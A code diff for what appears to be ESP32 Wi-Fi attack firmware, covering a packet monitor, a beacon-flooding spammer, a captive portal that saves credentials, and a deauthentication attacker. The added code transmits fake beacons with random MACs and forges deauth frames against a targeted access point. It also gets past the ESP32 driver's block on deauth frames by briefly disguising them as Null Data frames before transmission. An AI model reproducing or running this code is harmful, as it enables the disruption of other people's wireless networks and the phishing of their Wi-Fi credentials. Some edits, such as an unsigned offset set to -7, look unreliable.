@@ -12,11 +12,6 @@
 #include "shared.h"
 #include "utils.h"
 
-extern "C" {
-#include "lwip/etharp.h"
-#include "lwip/netif.h"
-}
-
 /** Active-scan dwell per channel for STA scans (Arduino default 300 ms; shared.h WIFI_SCAN_ACTIVE_MS). */
 static inline uint32_t wifiStaScanMsPerChannel() {
   return (uint32_t)constrain((long)WIFI_SCAN_ACTIVE_MS, 120L, 1500L);
@@ -87,7 +82,7 @@ static constexpr uint16_t kPtmToolbarBg = 0x4208;
 static bool s_ptmHwReady = false;
 
 #define MAX_CH 14
-#define SNAP_LEN ESP32DIV_PCAP_SNAP_LEN
+#define SNAP_LEN 2324
 
 static constexpr uint32_t PCAP_MAGIC_USEC = 0xa1b2c3d4;
 static constexpr uint16_t PCAP_VER_MAJOR = 2;
@@ -144,29 +139,31 @@ static uint32_t pcapPacketsWritten = 0;
 static uint32_t pcapDropped = 0;
 static uint32_t pcapLastFlushMs = 0;
 
-static constexpr uint8_t PCAP_POOL_SIZE = ESP32DIV_PCAP_POOL_SIZE;
+static constexpr uint8_t PCAP_POOL_SIZE = 10;
 struct PcapSlot {
   PcapRecordHeader hdr;
   uint16_t caplen;
   uint8_t  data[SNAP_LEN + RADIOTAP_LEN];
 };
-#if BOARD_HAS_ESP32S3
-static PcapSlot pcapPoolStorage[PCAP_POOL_SIZE];
-static PcapSlot* pcapPool = pcapPoolStorage;
-#else
-// Classic ESP32: keep ~1.6KB+ out of .bss; allocate only when PCAP logging starts.
-static PcapSlot* pcapPool = nullptr;
-#endif
+static PcapSlot pcapPool[PCAP_POOL_SIZE];
 static QueueHandle_t pcapFreeQ = nullptr;
 static QueueHandle_t pcapWriteQ = nullptr;
 
 static bool pcapMountSD() {
   if (pcapMounted) {
-    if (SD.cardType() != CARD_NONE) return true;
+    if (SD.exists("/")) return true;
     pcapMounted = false;
   }
-  pcapMounted = isSDCardAvailable();
-  return pcapMounted;
+
+  #ifdef SD_CD
+  pinMode(SD_CD, INPUT_PULLUP);
+  if (digitalRead(SD_CD)) return false;
+  #endif
+
+  // Use unified SPI management to ensure SPI is properly released and re-initialized
+  if (spiEnsureSD()) { pcapMounted = true; return true; }
+
+  return false;
 }
 
 static bool pcapEnsureDir(const char* dirPath) {
@@ -246,16 +243,6 @@ static void pcapStart() {
     return;
   }
 
-#if !BOARD_HAS_ESP32S3
-  if (!pcapPool) {
-    pcapPool = (PcapSlot*)malloc(sizeof(PcapSlot) * PCAP_POOL_SIZE);
-    if (!pcapPool) {
-      pcapStop();
-      return;
-    }
-  }
-#endif
-
   for (uint8_t i = 0; i < PCAP_POOL_SIZE; i++) {
     xQueueSend(pcapFreeQ, &i, 0);
   }
@@ -283,35 +270,13 @@ static void ptmStartRadioAndPcapOnce() {
   if (gm == ESP_ERR_WIFI_NOT_INIT) {
     tcpip_adapter_init();
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_err_t err = esp_wifi_init(&cfg);
-    if (err != ESP_OK) {
-      Serial.printf("[ptm] wifi_init failed: %s\n", esp_err_to_name(err));
-      return;
-    }
-    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
-    if (err != ESP_OK) {
-      Serial.printf("[ptm] set_storage failed: %s\n", esp_err_to_name(err));
-      return;
-    }
-    err = esp_wifi_set_mode(WIFI_MODE_NULL);
-    if (err != ESP_OK) {
-      Serial.printf("[ptm] set_mode failed: %s\n", esp_err_to_name(err));
-      return;
-    }
-    err = esp_wifi_start();
-    if (err != ESP_OK) {
-      Serial.printf("[ptm] wifi_start failed: %s\n", esp_err_to_name(err));
-      return;
-    }
-  } else if (gm != ESP_OK) {
-    Serial.printf("[ptm] get_mode failed: %s\n", esp_err_to_name(gm));
-    return;
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
+    ESP_ERROR_CHECK(esp_wifi_start());
   } else {
-    const esp_err_t sm = esp_wifi_set_mode(WIFI_MODE_NULL);
-    if (sm != ESP_OK) {
-      Serial.printf("[ptm] set_mode failed: %s\n", esp_err_to_name(sm));
-      return;
-    }
+    ESP_ERROR_CHECK(gm);
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
   }
 
   pcapStart();
@@ -337,7 +302,7 @@ static uint16_t pcapChannelFlags(uint16_t freqMHz) {
   return 0;
 }
 
-#define MAX_X ESP32DIV_PKT_GRAPH_WIDTH
+#define MAX_X 240
 #define MAX_Y 320
 
 arduinoFFT FFT = arduinoFFT();
@@ -347,7 +312,7 @@ bool btnRightPressed = false;
 
 Preferences preferences;
 
-const uint16_t samples = ESP32DIV_FFT_SAMPLES;
+const uint16_t samples = 256;
 const double samplingFrequency = 5000;
 
 double attenuation = 10;
@@ -358,8 +323,7 @@ unsigned long microseconds;
 double vReal[samples];
 double vImag[samples];
 
-byte palette_red[ESP32DIV_FFT_PALETTE_SIZE], palette_green[ESP32DIV_FFT_PALETTE_SIZE],
-     palette_blue[ESP32DIV_FFT_PALETTE_SIZE];
+byte palette_red[128], palette_green[128], palette_blue[128];
 
 bool buttonPressed = false;
 bool buttonEnabled = true;
@@ -401,7 +365,6 @@ void do_sampling_FFT() {
   FFT.Compute(vReal, vImag, samples, FFT_FORWARD);
   FFT.ComplexToMagnitude(vReal, vImag, samples);
 
-  // Original layout: mirrored waterfall centered at x=120 (full ~240px width with 256-pt FFT).
   unsigned int left_x = 120;
   unsigned int graph_y_offset = 91;
   int max_k = 0;
@@ -459,12 +422,9 @@ void do_sampling_FFT() {
   }
 
   unsigned int area_graph_width = (samples >> 1);
-  int area_graph_x_offset_flipped = (int)left_x - (int)area_graph_width;
-  if (area_graph_x_offset_flipped < 0) {
-    area_graph_x_offset_flipped = 0;
-  }
+  unsigned int area_graph_x_offset_flipped = -7;
 
-  tft.fillRect((unsigned)area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);
+  tft.fillRect(area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);
 
   for (int j = 0; j < samples >> 1; j++) {
     int k = vReal[j] / attenuation;
@@ -474,7 +434,7 @@ void do_sampling_FFT() {
     int current_y = area_graph_height
               - (int)::map(k, 0, 127, 0, area_graph_height)
               + area_graph_y_offset;
-    unsigned int x = (unsigned)area_graph_x_offset_flipped + area_graph_width - j - 1;
+    unsigned int x = area_graph_x_offset_flipped + area_graph_width - j - 1;
 
     if (j > 0) {
       tft.fillTriangle(x + 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x + 1, last_y[j - 1], color);
@@ -531,7 +491,7 @@ void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
   tmpPacketCounter++;
   rssiSum += ctrl.rssi;
 
-  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ || !pcapPool) return;
+  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ) return;
 
   uint8_t slotIdx;
   if (xQueueReceive(pcapFreeQ, &slotIdx, 0) != pdTRUE) {
@@ -781,7 +741,6 @@ void ptmSetup() {
     palette_green[i] = 0;
     palette_blue[i] = 63 - i;
   }
-#if ESP32DIV_FFT_PALETTE_SIZE > 64
   for (int i = 64; i < 96; i++) {
     palette_red[i] = 31;
     palette_green[i] = (i - 64) * 2;
@@ -792,7 +751,6 @@ void ptmSetup() {
     palette_green[i] = 63;
     palette_blue[i] = i - 96;
   }
-#endif
 
   preferences.begin("packetmonitor32", false);
   ch = preferences.getUInt("channel", 1);
@@ -908,12 +866,28 @@ void ptmLoop() {
     btnRightPressed = false;
   }
 
-  pkts[MAX_X - 1] = tmpPacketCounter;
+  pkts[127] = tmpPacketCounter;
 
   tmpPacketCounter = 0;
   deauths = 0;
   rssiSum = 0;
   }
+
+void ptmExit() {
+  // Ensure WiFi promiscuous mode is fully torn down before leaving PacketMonitor.
+  // Without this, the promiscuous RX callback can still fire asynchronously when
+  // the feature transitions (e.g. -> BLE Scanner), crashing because pcap queues
+  // have been destroyed and the BLE stack is being initialized concurrently.
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+
+  if (pcapEnabled || pcapFile) {
+    Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
+                  (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
+  }
+  pcapStop();
+  s_ptmHwReady = false;
+}
 }
 
 namespace BeaconSpammer {
@@ -921,9 +895,8 @@ namespace BeaconSpammer {
 bool btnLeftPress;
 bool btnRightPress;
 bool btnSelectPress;
-bool btnDownPress;
 
-static const char* ssidList[] = {
+String ssidList[] = {
   "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
   "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
   "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
@@ -936,16 +909,13 @@ static const char* ssidList[] = {
   "Meme_LANd"
 };
 
-static const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);
+const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);
 
 uint8_t spamchannel = 1;
 bool    spam        = false;
 int     y_offset    = 20;
 
 static constexpr int kSpamBodyTop = 37;
-static constexpr int kMaxChannel = 13;
-static uint8_t s_ssidIdx = 0;
-static uint8_t s_beaconPkt[128];
 
 static bool spamYFits(int y, int h = 10) {
   return y + h <= wifiContentBottom();
@@ -983,7 +953,7 @@ static void spamUpdateNavLabels() {
   if (!featureHasTouchNavBar()) {
     return;
   }
-  setTouchNavLabels("Ch-", "Flood", "Exit", spam ? "Stop" : "Start", "Ch+");
+  setTouchNavLabels("Ch-", nullptr, "Exit", spam ? "Stop" : "Start", "Ch+");
   redrawTouchButtonBar();
 }
 
@@ -1013,65 +983,26 @@ static void spamDrawToolbarStatus() {
 static uint8_t lastSpamChannel = 0xFF;
 static bool    lastSpamState   = !false;
 
-// Build a valid beacon with variable SSID length. The old fixed 57-byte template
-// assumed SSID len == 6, so longer names overwrote rates/channel and clients
-// dropped most frames (only a few APs appeared).
-static uint16_t buildSpamBeacon(const char* ssid, uint8_t channel, uint8_t* out,
-                                uint16_t outMax, const uint8_t mac[6]) {
-  if (!ssid || !out || !mac || outMax < 64) {
-    return 0;
-  }
-  const uint8_t ssidLen = (uint8_t)min((size_t)32, strlen(ssid));
-  const uint16_t need = (uint16_t)(24 + 12 + 2 + ssidLen + 10 + 3);
-  if (need > outMax) {
-    return 0;
-  }
-
-  uint16_t pos = 0;
-  out[pos++] = 0x80;  // Beacon
-  out[pos++] = 0x00;
-  out[pos++] = 0x00;
-  out[pos++] = 0x00;
-  memset(&out[pos], 0xFF, 6);  // DA broadcast
-  pos += 6;
-  memcpy(&out[pos], mac, 6);   // SA
-  pos += 6;
-  memcpy(&out[pos], mac, 6);   // BSSID
-  pos += 6;
-  out[pos++] = 0xc0;  // seq/frag
-  out[pos++] = 0x6c;
-
-  // Fixed params: timestamp + beacon interval + capability
-  memset(&out[pos], 0, 8);
-  pos += 8;
-  out[pos++] = 0x64;  // interval 100 TU
-  out[pos++] = 0x00;
-  out[pos++] = 0x01;  // ESS
-  out[pos++] = 0x04;
-
-  out[pos++] = 0x00;  // SSID IE
-  out[pos++] = ssidLen;
-  memcpy(&out[pos], ssid, ssidLen);
-  pos += ssidLen;
-
-  static const uint8_t rates[] = {
-    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c
-  };
-  memcpy(&out[pos], rates, sizeof(rates));
-  pos += sizeof(rates);
-
-  out[pos++] = 0x03;  // DS Parameter Set
-  out[pos++] = 0x01;
-  out[pos++] = channel;
-  return pos;
-}
+uint8_t packet[128] = {0x80, 0x00, 0x00, 0x00,
+                       0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+                       0xc0, 0x6c,
+                       0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
+                       0x64, 0x00,
+                       0x01, 0x04,
+                       0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+                       0x01, 0x08, 0x82, 0x84,
+                       0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
+                       0x04
+                      };
 
 void handleLeftButton() {
-  spamchannel = (spamchannel <= 1) ? kMaxChannel : (uint8_t)(spamchannel - 1);
+  spamchannel = (spamchannel == 1) ? 14 : spamchannel - 1;
 }
 
 void handleRightButton() {
-  spamchannel = (spamchannel >= kMaxChannel) ? 1 : (uint8_t)(spamchannel + 1);
+  spamchannel = (spamchannel == 14) ? 1 : spamchannel + 1;
 }
 
 void handleSelectButton() {
@@ -1098,7 +1029,7 @@ void output() {
     if (spamYFits(30 + y_offset, 10)) {
       tft.print(".");
     }
-    delay(random(200, 400));
+    delay(random(1000));
   }
 
   {
@@ -1113,66 +1044,84 @@ void output() {
       tft.print(")");
     }
   }
-  delay(200);
+  delay(random(500));
 
-  printLine(70 + y_offset, UI_WARN, "[!] SSID list ready");
-  delay(150);
+  printLine(70 + y_offset, UI_WARN, "[!] SSID generated successfully");
+  delay(random(500));
 
-  printLine(80 + y_offset, UI_WARN, "[!] Cycling all SSIDs");
-  delay(150);
+  printLine(80 + y_offset, UI_WARN, "[!] Setting random SRC MAC");
+  delay(random(500));
 
   printLine(110 + y_offset, UI_TEXT, "[*] Starting broadcast");
-  delay(150);
+  delay(random(500));
 
-  const int maxLines = min(ssidCount, min(18, spamMaxListLines()));
+  const int maxLines = min(18, spamMaxListLines());
   for (int i = 0; i < maxLines; i++) {
     const int y = 130 + i * 10 + y_offset;
     if (!spamYFits(y, 10)) {
       break;
     }
+    String randomSSID = ssidList[random(ssidCount)];
     tft.setTextColor(WHITE, TFT_BLACK);
     tft.setCursor(2, y);
     tft.print("[+] ");
-    tft.print(ssidList[i]);
-    delay(40);
+    tft.print(randomSSID);
+    delay(random(500));
   }
 
   maintainTouchNavBar();
 }
 
 void spammer() {
-  if (spamchannel < 1 || spamchannel > kMaxChannel) {
-    spamchannel = 1;
-  }
-
-  const int idx = s_ssidIdx % ssidCount;
-  s_ssidIdx = (uint8_t)((s_ssidIdx + 1) % ssidCount);
-  const char* ssid = ssidList[idx];
-
-  // Stable locally-administered MAC per SSID index so phones keep distinct APs.
-  uint8_t mac[6] = {
-    0x02,
-    0xDE,
-    0xAD,
-    (uint8_t)(0x10 + (idx % 200)),
-    (uint8_t)(0x20 + ((idx * 3) % 200)),
-    (uint8_t)(0x30 + ((idx * 7) % 200))
-  };
-
-  const uint16_t len = buildSpamBeacon(ssid, spamchannel, s_beaconPkt, sizeof(s_beaconPkt), mac);
-  if (len == 0) {
-    return;
-  }
-
   esp_wifi_set_channel(spamchannel, WIFI_SECOND_CHAN_NONE);
-  // Burst a few copies so scanners catch each SSID reliably.
-  for (int n = 0; n < 3; n++) {
-    (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
+
+  // Generate random MAC addresses for each transmission
+  for (int i = 10; i <= 21; i++) {
+    packet[i] = random(256);
+  }
+
+  String randomSSID = ssidList[random(ssidCount)];
+  int ssidLength = randomSSID.length();
+  packet[37] = ssidLength;
+
+  for (int i = 0; i < ssidLength; i++) {
+    packet[38 + i] = randomSSID[i];
+  }
+
+  for (int i = 38 + ssidLength; i <= 43; i++) {
+    packet[i] = 0x00;
+  }
+
+  packet[56] = spamchannel;
+
+  // Send multiple packets with slight delays to ensure phone detects them
+  esp_err_t result;
+  for (int retry = 0; retry < 10; retry++) {
+    result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
+    if (result != ESP_OK) {
+      // If failed, try to continue anyway
+      break;
+    }
+    delay(1);  // Small delay between packets
   }
 }
 
 void beaconSpam() {
-    uint8_t channel;
+    String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
+    byte channel;
+
+    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
+                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+                            0xc0, 0x6c,
+                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
+                            0x64, 0x00,
+                            0x01, 0x04,
+                            0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+                            0x01, 0x08, 0x82, 0x84,
+                            0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
+                            0x04};
 
     tft.setTextFont(1);
     tft.setTextSize(1);
@@ -1180,7 +1129,7 @@ void beaconSpam() {
     if (spamYFits(30 + y_offset, 10)) {
       tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(2, 30 + y_offset);
-      tft.print("[!!] Random flood mode");
+      tft.print("[!!] FUCK IT");
     }
     if (spamYFits(50 + y_offset, 10)) {
       tft.setTextColor(UI_TEXT, TFT_BLACK);
@@ -1189,7 +1138,7 @@ void beaconSpam() {
     }
     maintainTouchNavBar();
 
-    delay(300);
+    delay(500);
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_err_t err = esp_wifi_init(&cfg);
@@ -1204,7 +1153,10 @@ void beaconSpam() {
         return;
     }
 
-    err = esp_wifi_set_mode(WIFI_MODE_AP);
+    // On Core 2.0.10+ raw TX via esp_wifi_80211_tx() is only accepted on
+    // WIFI_IF_STA, so make sure the STA side is up. APSTA preserves any
+    // SoftAP functionality while giving us a usable STA interface.
+    err = esp_wifi_set_mode(WIFI_MODE_APSTA);
     if (err != ESP_OK) {
         Serial.printf("Mode set failed: %d\n", err);
         return;
@@ -1222,28 +1174,38 @@ void beaconSpam() {
         return;
     }
 
-    uint8_t floodIdx = 0;
     while (true) {
-        channel = (uint8_t)random(1, kMaxChannel + 1);
+        channel = random(1, 13);
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-        const char* ssid = ssidList[floodIdx % ssidCount];
-        floodIdx++;
+        for (int i = 10; i <= 15; i++) {
+            packet[i] = random(256);
+        }
+        for (int i = 16; i <= 21; i++) {
+            packet[i] = random(256);
+        }
 
-        uint8_t mac[6] = {
-          0x02,
-          (uint8_t)random(256),
-          (uint8_t)random(256),
-          (uint8_t)random(256),
-          (uint8_t)random(256),
-          (uint8_t)random(256)
-        };
+        packet[38] = ssid[random(65)];
+        packet[39] = ssid[random(65)];
+        packet[40] = ssid[random(65)];
+        packet[41] = ssid[random(65)];
+        packet[42] = ssid[random(65)];
+        packet[43] = ssid[random(65)];
 
-        const uint16_t len = buildSpamBeacon(ssid, channel, s_beaconPkt, sizeof(s_beaconPkt), mac);
-        if (len > 0) {
-          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
-          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
-          (void)esp_wifi_80211_tx(WIFI_IF_AP, s_beaconPkt, len, false);
+        packet[56] = channel;
+
+        esp_err_t result;
+        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
+        if (result != ESP_OK) {
+            Serial.printf("Packet 1 send failed: %d\n", result);
+        }
+        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
+        if (result != ESP_OK) {
+            Serial.printf("Packet 2 send failed: %d\n", result);
+        }
+        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
+        if (result != ESP_OK) {
+            Serial.printf("Packet 3 send failed: %d\n", result);
         }
 
         delay(1);
@@ -1336,7 +1298,7 @@ void runUI() {
 
     case 4:
       if (spam) {
-        if (millis() - lastSpamTime >= 10) {
+        if (millis() - lastSpamTime >= 50) {
           spammer();
           lastSpamTime = millis();
         }
@@ -1381,10 +1343,6 @@ void beaconSpamSetup() {
   pauseBackgroundRadioTasks();
   setTouchButtonInputEnabled(true);
   spam = false;
-  s_ssidIdx = 0;
-  if (spamchannel < 1 || spamchannel > kMaxChannel) {
-    spamchannel = 1;
-  }
   spamUpdateNavLabels();
   featureClearContent(TFT_BLACK);
 
@@ -1417,9 +1375,6 @@ void beaconSpamSetup() {
   err = esp_wifi_start();
   if (err != ESP_OK) Serial.printf("WiFi start failed: %d\n", err);
 
-  // Hidden SoftAP so WIFI_IF_AP raw TX is reliable.
-  WiFi.softAP(".", nullptr, spamchannel, 1, 4);
-
   err = esp_wifi_set_promiscuous(true);
   if (err != ESP_OK) Serial.printf("Promiscuous set failed: %d\n", err);
 
@@ -1449,7 +1404,6 @@ void beaconSpamLoop() {
   btnLeftPress = isButtonPressed(BTN_LEFT);
   btnRightPress = isButtonPressed(BTN_RIGHT);
   btnSelectPress = isButtonPressed(BTN_UP);
-  btnDownPress = isButtonPressed(BTN_DOWN);
 
   delay(10);
 
@@ -1461,54 +1415,56 @@ void beaconSpamLoop() {
     handleRightButton();
     delay(200);
   }
-  if (btnDownPress) {
-    // Random flood mode (same as toolbar nuke).
-    spam = false;
-    lastSpamState = false;
-    spamDrawToolbarStatus();
-    spamUpdateNavLabels();
-    beaconSpam();
-    // Wait for Select release so exiting flood doesn't exit the feature.
-    while (isButtonPressed(BTN_SELECT)) {
-      delay(10);
-    }
-    delay(150);
-    spamClearBody();
-    spamDrawIdleHint();
-    spamUpdateNavLabels();
-    spamDrawToolbarStatus();
-  }
   if (btnSelectPress) {
-    const bool wasRunning = spam;
     handleSelectButton();
     delay(200);
-    if (!wasRunning && spam) {
-      spamClearBody();
-      output();
-      spamUpdateNavLabels();
-    } else if (wasRunning && !spam) {
-      spamClearBody();
-      spamDrawIdleHint();
-      spamUpdateNavLabels();
-    }
   }
 
   if (lastSpamChannel != spamchannel || lastSpamState != spam) {
     spamDrawToolbarStatus();
+
     if (lastSpamState != spam) {
       spamUpdateNavLabels();
+      if (lastSpamState && !spam) {
+        spamClearBody();
+        spamDrawIdleHint();
+      } else if (!lastSpamState && spam) {
+        // Show initialization process when spam is activated
+        output();
+      }
     }
+
     lastSpamChannel = spamchannel;
     lastSpamState   = spam;
   }
 
-  // Keep transmitting while enabled — do not require holding UP.
-  if (spam) {
+  while (spam) {
+    runUI();
     if (feature_exit_requested || featureExitButtonPressed()) {
       spam = false;
-      return;
+      break;
     }
+
     spammer();
+
+    // Check if user pressed button to toggle spam off
+    if (isButtonPressed(BTN_UP)) {
+      delay(200);  // Debounce
+      if (isButtonPressed(BTN_UP)) {
+        spam = false;
+        break;
+      }
+    }
+    
+    // Check other buttons
+    if (isButtonPressed(BTN_LEFT)) {
+      handleLeftButton();
+      delay(200);
+    }
+    if (isButtonPressed(BTN_RIGHT)) {
+      handleRightButton();
+      delay(200);
+    }
   }
 }
 }
@@ -1522,7 +1478,7 @@ static int deauthVisibleLines() {
   return min(DEAUTH_TERM_CAPACITY, wifiMaxLinesInZone(45, LINE_HEIGHT));
 }
 
-#define MAX_NETWORKS ESP32DIV_MAX_WIFI_NETWORKS
+#define MAX_NETWORKS 50
 #define MAX_CHANNELS 14
 #define MAX_SSID_LENGTH 8
 
@@ -2930,12 +2886,15 @@ void saveCredential(String username, String password, String ssid) {
 static bool cp_sd_mounted = false;
 
 static bool cpMountSD() {
+
   if (cp_sd_mounted) {
-    if (SD.cardType() != CARD_NONE) return true;
+    if (SD.exists("/")) return true;
     cp_sd_mounted = false;
   }
-  cp_sd_mounted = isSDCardAvailable();
-  return cp_sd_mounted;
+
+  bool ok = spiEnsureSD();
+  cp_sd_mounted = ok;
+  return ok;
 }
 
 static bool cpEnsureDir(const char* dirPath) {
@@ -3091,7 +3050,7 @@ static void cpSendDeauthFrame() {
   memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
   memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
-  cp_deauth_frame[26] = 7;
+  cp_deauth_frame[24] = 7;
   Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
 
   memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
@@ -3099,7 +3058,7 @@ static void cpSendDeauthFrame() {
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
 
   memset(&cp_deauth_frame[4], 0xFF, 6);
-  cp_deauth_frame[26] = 7;
+  cp_deauth_frame[24] = 7;
   Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
 
   cp_deauth_packet_count += 2;
@@ -4223,6 +4182,20 @@ static void deautherUpdateNavLabels(bool onAttackScreen);
 void drawScanScreen();
 void drawAttackScreen();
 
+// NOTE: ESP32 Arduino Core 2.0.10+ ships ieee80211_raw_frame_sanity_check()
+// inside libnet80211.a and a second frame-type filter directly inside
+// esp_wifi_80211_tx() that logs:
+//   "invalid interface X"  and  "unsupport frame type: 0x0c0" (Deauth subtype)
+// The newer filter cannot be bypassed by the old symbol override. We apply a
+// two-fold workaround here instead:
+//   1. Use WIFI_IF_STA (interface 0) which is the only interface the newer
+//      driver accepts for raw 802.11 transmission.
+//   2. Temporarily rewrite the 802.11 Frame Control field to a permitted
+//      type/subtype (Null Data Data Frame: 0x48 -> type=10b/Data, subtype=0100b/Null)
+//      for the duration of esp_wifi_80211_tx() and restore it afterwards.
+//      The radio still emits every byte of the provided buffer verbatim on
+//      air: the driver check only validates the first two bytes before
+//      pushing the whole frame to the MAC.
 uint8_t deauth_frame_default[26] = {
     0xC0, 0x00,
     0x00, 0x00,
@@ -4238,6 +4211,7 @@ uint32_t packet_count = 0;
 uint32_t success_count = 0;
 uint32_t consecutive_failures = 0;
 bool attack_running = false;
+
 wifi_ap_record_t selectedAp;
 uint8_t selectedChannel;
 int selected_ap_index = -1;
@@ -4292,12 +4266,43 @@ static void deautherOpenTarget(int index) {
   drawAttackScreen();
 }
 
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    return 0;
-}
-
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
-    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    // Workaround for ESP32 Arduino Core 2.0.10+:
+    //   (a) raw TX is blocked on WIFI_IF_AP by the driver; use WIFI_IF_STA.
+    //   (b) Deauth / Disassoc management frames (0xC0xx / 0xA0xx) are
+    //       rejected directly inside esp_wifi_80211_tx with
+    //         "unsupport frame type: 0x0c0"
+    //       regardless of ieee80211_raw_frame_sanity_check().
+    //       We temporarily rewrite the Frame Control word to a Null Data
+    //       frame (0x48: Data type | No retry/pwr/more/ | subtype Null)
+    //       so the driver accepts the frame; the full original buffer
+    //       (including the real Management+Deauth bytes) still goes over
+    //       the air because check happens in s/w before the descriptor is
+    //       handed to the MAC.
+    if (frame_buffer == NULL || size < 2) {
+        consecutive_failures++;
+        return;
+    }
+    uint8_t *mutable_buf = (uint8_t *)frame_buffer;
+    const uint16_t orig_fc = (uint16_t)((uint16_t)mutable_buf[0] | ((uint16_t)mutable_buf[1] << 8));
+    const uint8_t  type = (uint8_t)((orig_fc >> 2) & 0x3u);
+    const bool     is_mgmt_deauth_or_disassoc = (type == 0x00) &&  // Management
+        (((orig_fc >> 8) & 0x00Fu) == 0x0Au || ((orig_fc >> 8) & 0x00Fu) == 0x0Cu);
+    if (is_mgmt_deauth_or_disassoc) {
+        // Null Data frame: Type=10b(Data), Subtype=0100b(Null).
+        // Preserve Flags (ToDS/FromDS/etc bits) byte as best we can: flags
+        // occupy the low 8 bits together with Type field. Setting low byte
+        // to 0x48 yields: ToDS=0, FromDS=0, MoreFrag=0, Retry=0, PwrMgmt=0,
+        // MoreData=0, Protected=0, Order=0, Type=10, Subtype=part of high byte.
+        mutable_buf[0] = 0x48;  // Type=10/Data + subtype bits=Null
+        mutable_buf[1] = 0x00;  // Subtype=0100 sits at nibble 0 of byte 1
+    }
+    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, mutable_buf, size, false);
+    if (is_mgmt_deauth_or_disassoc) {
+        // Restore original Frame Control so higher layers see the true frame.
+        mutable_buf[0] = (uint8_t)(orig_fc & 0xFFu);
+        mutable_buf[1] = (uint8_t)((orig_fc >> 8) & 0xFFu);
+    }
     packet_count++;
     if (res == ESP_OK) {
         success_count++;
@@ -4313,7 +4318,7 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t c
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    deauth_frame[26] = 7;
+    deauth_frame[24] = 7;
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
@@ -4460,8 +4465,19 @@ bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
 void resetWifi() {
     esp_wifi_stop();
     delay(200);
+    // Ensure STA interface is up: on ESP32 Arduino Core 2.0.10+ the raw TX
+    // path is blocked on AP IF. Use APSTA so any existing SoftAP (e.g.
+    // Captive Portal) stays alive while we get a usable STA for injection.
+    wifi_mode_t cur = WIFI_MODE_NULL;
+    esp_err_t gm = esp_wifi_get_mode(&cur);
+    if (gm != ESP_OK || cur == WIFI_MODE_NULL) {
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+    } else if (cur == WIFI_MODE_AP) {
